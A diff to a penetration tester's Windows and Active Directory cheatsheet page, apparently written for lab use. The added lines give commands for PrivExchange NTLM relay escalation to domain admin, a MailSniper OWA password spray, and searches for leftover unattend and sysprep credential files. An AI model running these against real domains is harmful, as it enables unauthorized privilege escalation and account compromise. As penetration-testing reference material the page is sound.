@@ -1,6 +1,6 @@
 ---
 title: Windows Notes / Cheatsheet
-published: false
+published: true
 ---
 
 # [](#header-1)Windows Notes / Cheatsheet
@@ -304,9 +304,50 @@ NTLM-Relay
 
 Priv Exchange
 
+```
+#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
+
+Combine privxchange.py and ntlmrelayx
+
+ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE
+
+python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local
+
+```
+
+
+
+
+
+Password Spraying
+
+
+
+CrackMapExec
+
+
+
+Mail Sniper
+
+```
+Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019
+
+[*] Now spraying the OWA portal at https://m0chanAD.local/owa/
+
+[*] SUCCESS! User:m0chan:Summer2019
+
+Lmao, you really think I'd use the pass Summer2019?
+```
+
+
+
+
+
 ## [](#header-2)Privilege Escalation
 
 Reference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+
+Run this script: https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat
 
 Basics
 
@@ -495,6 +536,22 @@ Any Sysrep or Unattend Files Left Over
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
+```
+
+
+
+Token Impersonation
+
+```
+
+```
+
+
+
+Juicy Potato
+
+```
+
 ```
 
 
